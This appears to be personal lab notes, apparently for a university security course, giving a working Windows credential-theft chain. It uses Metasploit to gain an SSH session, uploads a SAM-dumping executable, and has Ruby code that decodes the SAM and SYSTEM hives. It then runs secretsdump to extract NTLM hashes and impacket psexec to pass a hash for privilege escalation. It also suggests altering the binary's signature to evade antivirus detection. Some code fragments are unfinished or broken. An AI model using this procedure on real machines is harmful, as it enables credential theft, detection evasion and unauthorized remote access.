# Steps

``` sh
sudo msfconsole
# this is a contrived stand-in for some exploit that has already obtained a shell
use scanner/ssh/ssh_login
set USERNAME user
set PASSWORD ece
set RHOSTS 10.0.2.4
run # should connect. Use whatever method to get a shell that's suitable for you. Type 'sessions' to see your shell session
sessions -i 1
cmd
user@DESKTOP-02CPT0R C:\Users\user>irb
[*] Starting IRB shell...
[*] You are in the "self" (session) object
```

```
irb
n = 1 # for session 1
# Possible variation: maybe python isn't allowed to run over ssh, so you'd upload a zipped executable, such as one made by `py2exe` and then extract + run it.
framework.sessions[n].cmd_upload("/path/to/get_sam", "%userprofile%/Desktop/get_sam")
framework.sessions[n].shell_cmd("%userprofile%/Desktop/get_sam") # maybe tweak get_sam to print the hashes or export to a file we can download\
```

``` ruby
get_sam_command = "%userprofile%\\getsam\\get_sam.exe"

self.platform = "windows" # probably not needed
self.shell_command("mkdir %userprofile%\\getsam")
self.shell_command("cd %userprofile%\\getsam")
self.cmd_upload("/media/sf_share/get_sam.zip", "%userprofile%\\getsam\\get_sam.zip")
self.shell_command("tar -xf get_sam.zip")
parts = self.shell_command(get_sam_command).split()
sam_hive = Base64.decode64(parts[1][2..-2])
sys_hive = Base64.decode64(parts[2][2..-2])
File.open("sam.hive", 'w') { |file| file.write(sam_hive) }
File.open("sys.hive", 'w') { |file| file.write(sys_hive) }
dump = `python3 secretsdump.py -sam sam.hive -sys sys.hive local`
sentinel = "(uid:rid:lmhash:nthash)"
info_re = /(?<user>\w+):\d+:(?<lmhash>\w+):(?<nthash>\w+)/
for entry in dump.split() do
    m = entry.match(info_re)
    if m
        user = m[:user]
    end
end



https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
user = "ece509"
ip_addr = "10.0.2.4"

python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:1eee20c4f112dfb101c08fd15f066ef5 user@ip_addr powershell.exe




# b64_hashes = self.framework.sessions[1].shell_command("%userprofile%\\getsam\\get_sam.exe").split()[1][2..-2] # more useful since working within the session is a little limiting.
# raw_hashes = Base64.decode64(b64_hashes)
f = File('hashes', 'w')
f.write(raw_hashes)
f.close


sudo apt install pip
sudo pip3 install impacket --upgrade
Installs to:
/usr/local/lib/python3.8/dist-packages/impacket/examples/secretsdump.py

system and sam are needed for secretsdump.py






```

If your target doesn't have python installed, you can create an executable with access to a Windows machine:
```
C:\Users\user\Desktop\WPy64-3980\python-3.9.8.amd64\python.exe
> python.exe setup.py py2exe -b 0
```
**Note** you may also need to package VCRUNTIMExxx.dll. It's possible the setup.py script could be tweaked to borrow your system's VCRUNTIME DLL. Maybe setup.py could also inject noisy functions into get_sam.py prior to compilation to change the executable's signature and avoid detection.

Alternatively you could upload a python distribution, but that's massive.

## TODO:
1. retrieve target hashes
2. run dump_secrets on those hashes
3. run psexec exploit for privilege escalation